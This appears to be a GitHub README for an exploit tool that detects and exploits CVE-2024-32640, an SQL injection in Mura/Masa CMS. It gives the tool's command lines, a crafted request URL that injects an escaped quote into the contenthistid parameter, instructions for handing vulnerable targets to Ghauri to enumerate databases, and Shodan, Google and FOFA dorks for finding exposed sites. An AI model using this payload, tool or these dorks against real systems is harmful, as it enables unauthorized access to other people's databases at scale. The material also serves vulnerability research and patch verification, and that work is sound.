# Muraider - Automating the detection & Exploitation of CVE-2024-32640 \ SQLi in Mura/Masa CMS

# Usage

## Detection:
`python3 CVE-2024-32640.py --url https://target.com/`

## Ghauri Exploitation (Pass '-g' or '--ghauri' as argument):

Parse in any arguments that you wish to use with Ghauri, following their argument list:

`python3 CVE-2024-32640.py --url https://target.com -g "--dbs --current-db"`

`python3 CVE-2024-32640.py --url https://target.com --ghauri "--dbs --current-db"`

# Example

![image](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS/assets/60468836/c728db35-ece0-4ef2-9980-534be54def07)

# Ghauri SQLI Auotmation:

Using the detection that I've implemented into the tool, we can then use the vulnerable target to exploit in Ghauri. The script automates this process, parsing all the target information needed into a call to Ghauri.

![image](https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS/assets/60468836/afbc4b6f-2310-48c2-b9b1-9cd2039be1ab)


# Details

By appending an escape sequence (`%5c`) to the contenthisid HTML Query Parameter value, we're able to verify if a target is vulnerbale to this SQLi. 

Successful exploitation could lead to unauthorized access to sensitive data.

URL: `https://target.com/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c'&previewID=x`

# Dorks

Shodan-query: `'Generator: Masa CMS'`

Google: `"powered by Mura CMS"`

FOFA: `app="Mura-CMS"`

# References:

https://twitter.com/HunterMapping/status/1790620695371911388

https://www.seebug.org/vuldb/ssvid-99835
